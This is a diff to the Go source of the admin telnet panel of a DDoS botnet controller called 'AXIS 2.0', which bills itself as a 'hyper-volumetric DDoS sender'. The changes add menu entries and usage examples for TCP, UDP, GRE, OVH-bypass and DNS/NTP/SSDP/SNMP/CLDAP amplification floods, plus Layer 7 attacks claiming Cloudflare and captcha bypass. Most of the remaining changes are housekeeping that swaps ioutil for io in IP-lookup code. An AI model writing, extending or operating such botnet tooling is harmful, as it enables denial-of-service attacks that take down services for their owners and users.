@@ -2,7 +2,7 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -75,7 +75,7 @@ func (this *Admin) Handle() {
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╔═╗\x1b[1;32m═╗ ╦\x1b[1;35m╦\x1b[1;32m╔═╗\x1b[1;35m Distributed\x1b[0m\r\n"))
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╠═╣\x1b[1;32m╔╩╦╝\x1b[1;35m║\x1b[1;32m╚═╗\x1b[1;35m Denial\x1b[0m\r\n"))
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╩ ╩\x1b[1;32m╩ ╚═\x1b[1;35m╩\x1b[1;32m╚═╝\x1b[1;35m Of Service\x1b[0m\r\n"))
-	this.conn.Write([]byte("\x1b[90m                    hyper-volumetric DDoS sender\r\n"))
+	this.conn.Write([]byte("\x1b[90m                  hyper-volumetric DDoS sender\r\n"))
 
 	// Start window title updater
 	go func() {
@@ -145,18 +145,23 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 4 | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mVolumetric:\x1b[1;32m                                                                    ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33mudp\x1b[1;32m, \x1b[1;33micmp\x1b[1;32m, \x1b[1;33maxis-l4\x1b[1;32m (combined attack)                           ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33mudp\x1b[1;32m, \x1b[1;33micmp\x1b[1;32m                                                      ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mOVH Bypass:\x1b[1;32m                                                                      ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33movhtcp\x1b[1;32m, \x1b[1;33movhudp\x1b[1;32m                                                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mGRE:\x1b[1;32m                                                                           ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m                                                                   ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mULTIMATE:\x1b[1;32m                                                                      ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33multimate-l4\x1b[1;32m (ALL-in-one: TCP+UDP+ICMP+GRE with IP spoofing)                  ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mAMPLIFICATION:\x1b[1;32m                                                                 ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mdns-amp\x1b[1;32m, \x1b[1;33mntp-amp\x1b[1;32m, \x1b[1;33mssdp-amp\x1b[1;32m, \x1b[1;33msnmp-amp\x1b[1;32m, \x1b[1;33mcldap-amp\x1b[1;32m                  ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mAXIS COMBINED:\x1b[1;32m                                                               ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33maxis-tcp\x1b[1;32m - TCP+OVH-TCP+ICMP+GRE (40/30/10/10/10%)                        ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33maxis-udp\x1b[1;32m - UDP+OVH-UDP+ALL_AMP+VSE+ICMP+GRE (most powerful)              ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mtcp <ip> <time> dport=<port>\x1b[1;32m                                        ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33movhtcp <ip> <time> dport=27015\x1b[1;32m                               ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33mgreip <ip> <time> dport=80\x1b[1;32m                                   ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33multimate-l4 <ip> <time> dport=80\x1b[1;32m                             ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33mdns-amp <ip> <time>\x1b[1;32m (no port needed)                         ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-tcp <ip> <time> tcpport=80 greport=80\x1b[1;32m                 ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-udp <ip> <time> udpport=53 greport=53\x1b[1;32m                 ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -166,11 +171,9 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Layer 7 (HTTP) | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33maxis-l7\x1b[1;32m (browser emulation + captcha bypass + CF bypass)            ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33multimate-l7\x1b[1;32m (ULTIMATE L7 - CF/Akamai/WAF bypass + session mgmt + adaptive)    ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mhttp https://example.com/ 60\x1b[1;32m                                       ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-l7 https://target.com/ 120 domain=target.com\x1b[1;32m                  ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33multimate-l7 https://protected.site/ 300 domain=target.com\x1b[1;32m          ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -179,10 +182,9 @@ func (this *Admin) Handle() {
 		if cmd == "SPECIAL" || cmd == "special" || cmd == "SPEC" || cmd == "spec" {
 			this.conn.Write([]byte("\x1b[1;90m                --> | Special | <--\x1b[0m\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33micmp\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m, \x1b[1;33maxis-l4\x1b[1;32m (combined)                                   ║\r\n"))
+			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33micmp\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m                                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════════════════════════════╣\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33micmp <ip> <time>\x1b[1;32m                                                    ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║          \x1b[1;33maxis-l4 <ip> <time> dport=80\x1b[1;32m                                   ║\r\n"))
 			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════════════════════════════╝\x1b[0m\r\n"))
 			continue
 		}
@@ -223,7 +225,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mHey \033[01;37m" + username + "!\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont spam attacks! Dont share logins!\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont attack government targets!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mAXIS 2.0 - Final version\r\n")))
+			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mAXIS 2.0 - Merged Edition\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mVersion\033[01;36m:\033[01;37m \033[01;37mv2.0\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m\033[01;36m ══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
 			continue
@@ -318,7 +320,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
@@ -346,7 +348,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!\033[37;1m\r\n")))
 				continue
@@ -374,7 +376,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
@@ -402,7 +404,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
@@ -430,7 +432,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!033[37;1m\r\n")))
 				continue
@@ -458,7 +460,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
 				continue
@@ -486,7 +488,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
@@ -514,7 +516,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
@@ -542,7 +544,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
@@ -570,7 +572,7 @@ func (this *Admin) Handle() {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
 			}
-			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
+			locresponsedata, err := io.ReadAll(locresponse.Body)
 			if err != nil {
 				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
 				continue
